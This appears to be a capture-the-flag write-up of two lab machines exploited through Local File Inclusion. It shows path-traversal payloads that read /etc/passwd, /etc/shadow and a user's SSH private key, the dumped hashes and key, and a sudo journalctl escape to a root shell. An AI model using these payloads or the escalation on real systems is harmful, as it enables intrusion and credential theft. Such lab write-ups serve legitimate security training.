1- LFI walkthrough
2- LFI inclusion





# 1-  LFI walkthrou
Local File Inclusion 

https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks


[Errno 2] No such file or directory: '/opt/web/pwd' 

../../pwd

../../etc/passwd

shadow
```bash
root:$6$UVbVpBq4$O8f/Nk488RT95VcJpLl0WgwOuguU6kCRBVE3EHGHFviJJV9MNfb0GbK38WryIkx72d/DKh3HBprBYTcNJf0Xn0:18289:0:99999:7::: daemon:*:17647:0:99999:7::: bin:*:17647:0:99999:7::: sys:*:17647:0:99999:7::: sync:*:17647:0:99999:7::: games:*:17647:0:99999:7::: man:*:17647:0:99999:7::: lp:*:17647:0:99999:7::: mail:*:17647:0:99999:7::: news:*:17647:0:99999:7::: uucp:*:17647:0:99999:7::: proxy:*:17647:0:99999:7::: www-data:*:17647:0:99999:7::: backup:*:17647:0:99999:7::: list:*:17647:0:99999:7::: irc:*:17647:0:99999:7::: gnats:*:17647:0:99999:7::: nobody:*:17647:0:99999:7::: systemd-network:*:17647:0:99999:7::: systemd-resolve:*:17647:0:99999:7::: syslog:*:17647:0:99999:7::: messagebus:*:17647:0:99999:7::: _apt:*:17647:0:99999:7::: lxd:*:18289:0:99999:7::: uuidd:*:18289:0:99999:7::: dnsmasq:*:18289:0:99999:7::: landscape:*:18289:0:99999:7::: pollinate:*:18289:0:99999:7::: falcon:$6$xQmTDVmT$hgSLG3ebs.8Tc/F4qqXNnvBBnG736EWpWKaprFVARjAsZ6JyoL4WaJdGv5.qddMWF4/MoJgN6Hekri8wyJ97k/:18289:0:99999:7::: sshd:*:18289:0:99999:7::: 

falcon:$6$xQmTDVmT$hgSLG3ebs.8Tc/F4qqXNnvBBnG736EWpWKaprFVARjAsZ6JyoL4WaJdGv5.qddMWF4/MoJgN6Hekri8wyJ97k/:18289:0:99999:7:::

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 

falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash

../../home/falcon/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAy5ab5+v0aBYFL7dN4O69CqvZdjpSk4/BFMOEndp71fy4qlBi ewnTYIyKS1DjNhLdbLJZV/8oKOIx/BVSxrw3hnjL/b5d3jUpX1edcX8hjTt10LCT ubgjWekIpspImHtp/vf9n0IlL1GIWLsxKZXEqyoSvvG4LU6ajrMyHM9jyZ7yMAsS lHtfNzX22taxJliHF3SFDjf6Z0otY98T273qy6uTchBDEIZx7uJGQF4h9bvSq+22 e7QFY/h/cLrVUPGcRgv2VH4958A5n+BA48ioVyjGRcJlPsa8fNuFkgA8VlJqx/zD Erf3G97zCY5iZSSm6g+9aUBAoqJqQqnZ1JY/jQIDAQABAoIBAQCjN3qEY7GM5OKB j6Z7B0s9S+rKkxVywdQczmb6mpefRb3SpSFe3NC+3c1ddlrCFju4kf94wdIzfKxw GbREKc8mGqAILN9abypdCoPp4u9GJ/5bMcUtJogI4/+QoCm1PXQL+ks1q7TeC7KQ 2HogibajNtbSiD2M7TCR6O3rFQU+NKW3P8R5rTJBFxSqXcoL0aZoOdIISuGo4e2D w5p8eLHiYmKmQ3KYW58fau1Qnr8t0YoHDlG2wezNBQSckt5xxjY4XWlfcMPAQIP9 VWxv77zIqfLFYj6oH0opPHX7SbdpFVj00h7Ee2C0QR7CKj4lxmE2Dn97LEXksfWM PqmJwiRBAoGBAPRGPZtAT7TfTac7lXbOYNj/5HuK1Pc7+GtsT8V3AJwbhkeZG/B+ ERee3gKlXhglEup0duxBwy5zTy6vsegMo7sk2ii/GlboR44Yy7OYbjrmIw7JRx6i IIjN6YeKM+dwLGL7+xG2EavrRBJbuYfp1R139gK5CWd6Yu6xdwtCPS8xAoGBANVc ZhSQOWzkN0Yq4CsAnKrrtIeynX7wTppy2F3N8/CQHQIYjFx0SZxs/1MlTXEpFdC+ VHhQ+Cy5O+hndqXiG5sty9wC67lZNaxuBkMoxKgX42JAgxxE41lUadAdRHJ4cq7A 1DiJ1xq3XwP1ZaUEVE/Y3EusMhtr/A6z1dGJcpcdAoGAdb6d14XqZb71iVS5OOlF 2ZOPKNXEzd+EYRN2aDJygszprv1ocEX0KzSSwye+8Vh9g7Hb2Qnh8TP3yQM7eCUP jxe2aMmlAps4UpA1MD6bc5yW7Xur4mI32HmYxZKibj6txpC7dtASOJJQ36CDD7Zw 2aGHXcyfcdeWdIPqY+zr3SECgYEAoi4SCh93ByaSPWvp6cYVUHbKSzuiLBNOLGiP vv4GJx3kbutqBfz+10Ci8/iu3Q11365NVwd1HcnPl+DNd1pf0Z0GEL7Hn6QIAIHB kNs0YPGHje+ruZlDl2tq4x7cIIcd5Wf96Nwd/djVCJVIJh8cV3VoPr0teVqjxik8 poHr8KECgYBGJ/FLmaloEl00YECXAy2uMlvGyaAr2tsq28JF3LvZOXNIhB71+11V E/gv9PP0ruJJRBv5r2DjAcsWA+sIBf5O8+z5dTeuto5v+WTrpOy8i3FLEWl3hqRH ANCTI4EhCynYtF8zi8so5zeomlncFZg7JD/dL0gHXu4FImx5sUO9gg== -----END RSA PRIVATE KEY----- 
```
have to format, 
```bash
┌──(kali㉿kali)-[/hackme]
└─$ cat id_rsa       
-----BEGIN RSA PRIVATE KEY----- 
MIIEpAIBAAKCAQEAy5ab5+v0aBYFL7dN4O69CqvZdjpSk4/BFMOEndp71fy4qlBi 
ewnTYIyKS1DjNhLdbLJZV/8oKOIx/BVSxrw3hnjL/b5d3jUpX1edcX8hjTt10LCT 
ubgjWekIpspImHtp/vf9n0IlL1GIWLsxKZXEqyoSvvG4LU6ajrMyHM9jyZ7yMAsS 
lHtfNzX22taxJliHF3SFDjf6Z0otY98T273qy6uTchBDEIZx7uJGQF4h9bvSq+22 
e7QFY/h/cLrVUPGcRgv2VH4958A5n+BA48ioVyjGRcJlPsa8fNuFkgA8VlJqx/zD 
Erf3G97zCY5iZSSm6g+9aUBAoqJqQqnZ1JY/jQIDAQABAoIBAQCjN3qEY7GM5OKB 
j6Z7B0s9S+rKkxVywdQczmb6mpefRb3SpSFe3NC+3c1ddlrCFju4kf94wdIzfKxw 
GbREKc8mGqAILN9abypdCoPp4u9GJ/5bMcUtJogI4/+QoCm1PXQL+ks1q7TeC7KQ 
2HogibajNtbSiD2M7TCR6O3rFQU+NKW3P8R5rTJBFxSqXcoL0aZoOdIISuGo4e2D 
w5p8eLHiYmKmQ3KYW58fau1Qnr8t0YoHDlG2wezNBQSckt5xxjY4XWlfcMPAQIP9 
VWxv77zIqfLFYj6oH0opPHX7SbdpFVj00h7Ee2C0QR7CKj4lxmE2Dn97LEXksfWM 
PqmJwiRBAoGBAPRGPZtAT7TfTac7lXbOYNj/5HuK1Pc7+GtsT8V3AJwbhkeZG/B+ 
ERee3gKlXhglEup0duxBwy5zTy6vsegMo7sk2ii/GlboR44Yy7OYbjrmIw7JRx6i 
IIjN6YeKM+dwLGL7+xG2EavrRBJbuYfp1R139gK5CWd6Yu6xdwtCPS8xAoGBANVc 
ZhSQOWzkN0Yq4CsAnKrrtIeynX7wTppy2F3N8/CQHQIYjFx0SZxs/1MlTXEpFdC+ 
VHhQ+Cy5O+hndqXiG5sty9wC67lZNaxuBkMoxKgX42JAgxxE41lUadAdRHJ4cq7A 
1DiJ1xq3XwP1ZaUEVE/Y3EusMhtr/A6z1dGJcpcdAoGAdb6d14XqZb71iVS5OOlF 
2ZOPKNXEzd+EYRN2aDJygszprv1ocEX0KzSSwye+8Vh9g7Hb2Qnh8TP3yQM7eCUP 
jxe2aMmlAps4UpA1MD6bc5yW7Xur4mI32HmYxZKibj6txpC7dtASOJJQ36CDD7Zw 
2aGHXcyfcdeWdIPqY+zr3SECgYEAoi4SCh93ByaSPWvp6cYVUHbKSzuiLBNOLGiP 
vv4GJx3kbutqBfz+10Ci8/iu3Q11365NVwd1HcnPl+DNd1pf0Z0GEL7Hn6QIAIHB 
kNs0YPGHje+ruZlDl2tq4x7cIIcd5Wf96Nwd/djVCJVIJh8cV3VoPr0teVqjxik8 
poHr8KECgYBGJ/FLmaloEl00YECXAy2uMlvGyaAr2tsq28JF3LvZOXNIhB71+11V 
E/gv9PP0ruJJRBv5r2DjAcsWA+sIBf5O8+z5dTeuto5v+WTrpOy8i3FLEWl3hqRH 
ANCTI4EhCynYtF8zi8so5zeomlncFZg7JD/dL0gHXu4FImx5sUO9gg== 
-----END RSA PRIVATE KEY----- 
``` 

user flag is right there, 

### escalating

sudo -l

falcon@walk:~$ sudo -l
Matching Defaults entries for falcon on walk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl


http://gtfobins.github.io/

http://github.com/mzfr/gtfo


```bash
falcon@walk:~$ sudo journalctl
-- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Fri 2021-05-07 21:44:08 IST. --
Jan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC
Jan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generic root=UUID=979754d8-4db7-4b66-a804-28a498c1cc0f ro
Jan 28 19:00:21 walk kernel: KERNEL supported cpus:
Jan 28 19:00:21 walk kernel:   Intel GenuineIntel
Jan 28 19:00:21 walk kernel:   AMD AuthenticAMD
Jan 28 19:00:21 walk kernel:   Centaur CentaurHauls
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
Jan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
Jan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.
Jan 28 19:00:21 walk kernel: e820: BIOS-provided physical RAM map:
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000100000-0x000000003ffeffff] usable
!/bin/sh
# whoami
root
# ls
user.txt
# cd ..   
# ls
falcon
# cd ..
# ls
bin   dev  home        initrd.img.old  lib64	   media  opt	root  sbin  srv       sys  usr	vmlinuz
boot  etc  initrd.img  lib	       lost+found  mnt	  proc	run   snap  swapfile  tmp  var	vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
H1EQRK5XEX140H2KMO08
```


# 2-  LFI inclusion 

../../../etc/passwd

../../../etc/shadow

../../../home/falconfeast/.ssh/id_rsa


http://10.10.205.154/article?name=../../../etc/passwd
```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false 


falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword


root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7::: daemon:*:17647:0:99999:7::: bin:*:17647:0:99999:7::: sys:*:17647:0:99999:7::: sync:*:17647:0:99999:7::: games:*:17647:0:99999:7::: man:*:17647:0:99999:7::: lp:*:17647:0:99999:7::: mail:*:17647:0:99999:7::: news:*:17647:0:99999:7::: uucp:*:17647:0:99999:7::: proxy:*:17647:0:99999:7::: www-data:*:17647:0:99999:7::: backup:*:17647:0:99999:7::: list:*:17647:0:99999:7::: irc:*:17647:0:99999:7::: gnats:*:17647:0:99999:7::: nobody:*:17647:0:99999:7::: systemd-network:*:17647:0:99999:7::: systemd-resolve:*:17647:0:99999:7::: syslog:*:17647:0:99999:7::: messagebus:*:17647:0:99999:7::: _apt:*:17647:0:99999:7::: lxd:*:18281:0:99999:7::: uuidd:*:18281:0:99999:7::: dnsmasq:*:18281:0:99999:7::: landscape:*:18281:0:99999:7::: pollinate:*:18281:0:99999:7::: falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7::: sshd:*:18281:0:99999:7::: mysql:!:18281:0:99999:7::: 


falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7:::
```


http://10.10.205.154/article?name=../../../home/falconfeast/user.txt

http://10.10.205.154/article?name=../../../root/root.txt








